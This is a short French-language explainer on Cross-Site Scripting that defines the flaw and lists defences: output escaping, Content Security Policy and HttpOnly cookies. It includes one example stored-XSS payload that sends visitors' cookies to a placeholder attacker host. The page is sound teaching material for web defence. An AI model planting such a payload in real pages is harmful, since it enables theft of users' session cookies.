Le **Cross-Site Scripting (XSS)** se produit quand un attaquant parvient à faire exécuter son propre JavaScript à l'intérieur d'une page sous une origine *différente et de confiance* — ce qui signifie que ce script s'exécute avec le même accès aux cookies, au DOM et aux appels d'API qu'aurait un script légitime de cette page. Ce n'est pas un bug du navigateur ; c'est un échec à empêcher que des données non fiables soient interprétées comme du code.

## Un exemple minimal

Si une page affiche un commentaire ainsi sans l'échapper :

```html
<div>{{ comment }}</div>
```

et qu'un commentaire contient `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`, chaque visiteur qui consulte ce commentaire exécute le script de l'attaquant — sous l'origine propre du site, avec accès aux cookies de ce site (sauf si [`HttpOnly`](/fr/security/sessions) est défini).

## Ce qui l'empêche réellement

- **Échapper la sortie** — encoder les données contrôlées par l'utilisateur avant de les insérer dans le HTML, de sorte que `<script>` devienne du texte littéral (`&lt;script&gt;`) au lieu d'une balise. La plupart des frameworks modernes (React, Vue) font cela par défaut, ce qui explique pourquoi le contourner manuellement (`dangerouslySetInnerHTML`, `v-html`) mérite un examen supplémentaire.
- **Content Security Policy** — même si du balisage malveillant passe à travers, une [CSP](/fr/security/content-security-policy) stricte peut empêcher entièrement l'exécution de scripts en ligne.
- **Les cookies `HttpOnly`** — n'empêchent pas le script de s'exécuter, mais l'empêchent de pouvoir lire les cookies de session même s'il s'exécute.
